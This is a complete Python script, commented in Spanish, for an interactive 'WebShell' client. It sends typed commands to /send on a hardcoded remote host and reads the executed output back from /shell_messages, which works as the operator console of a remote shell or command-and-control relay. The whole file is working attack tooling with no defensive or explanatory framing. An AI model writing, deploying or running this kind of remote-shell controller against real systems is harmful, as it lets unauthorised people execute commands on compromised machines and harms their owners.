import requests
import time
import os
import sys

class WebShell:
    def __init__(self, base_url):
        self.base_url = base_url
        self.ultimo_comando = ""
    
    def enviar_comando(self, comando):
        """Envía un comando al servidor"""
        try:
            response = requests.post(f"{self.base_url}/send", data=comando)
            if response.status_code == 200:
                return True
            else:
                print(f"Error al enviar comando: {response.status_code}")
                return False
        except Exception as e:
            print(f"Error de conexión: {e}")
            return False
    
    def obtener_salida(self):
        """Obtiene la salida del último comando ejecutado"""
        try:
            response = requests.get(f"{self.base_url}/shell_messages")
            if response.status_code == 200:
                return response.text
            else:
                return f"Error: {response.status_code}"
        except Exception as e:
            return f"Error de conexión: {e}"
    
    def ejecutar_comando(self, comando):
        """Ejecuta un comando en la shell remota"""
        if comando.strip() == "":
            return
        
        if comando.strip().lower() in ['exit', 'quit']:
            print("Saliendo de la shell...")
            sys.exit(0)
        
        if comando.strip().lower() == 'clear':
            os.system('clear' if os.name == 'posix' else 'cls')
            return
        
        print(f"[*] Enviando: {comando}")
        
        if self.enviar_comando(comando):
            # Esperar un poco para que el servidor procese
            time.sleep(0.5)
            
            # Obtener la salida
            salida = self.obtener_salida()
            if salida:
                print(salida)
            else:
                print("[!] No se recibió salida")
        else:
            print("[!] Falló al enviar el comando")
    
    def shell_interactiva(self):
        """Inicia una shell interactiva"""
        print("=" * 50)
        print("    WebShell Interactiva")
        print("    Comandos especiales: exit, clear")
        print("=" * 50)
        print()
        
        while True:
            try:
                # Mostrar prompt
                comando = input("shell> ").strip()
                
                # Ejecutar el comando
                self.ejecutar_comando(comando)
                
            except KeyboardInterrupt:
                print("\n[!] Interrupción detectada. Usa 'exit' para salir.")
            except Exception as e:
                print(f"[!] Error inesperado: {e}")

def main():
    # Configuración
    url = "http://chocolate.cuackerman.uk"
    
    # Crear la shell
    shell = WebShell(url)
    
    # Iniciar la shell interactiva
    shell.shell_interactiva()

if __name__ == "__main__":
    main()
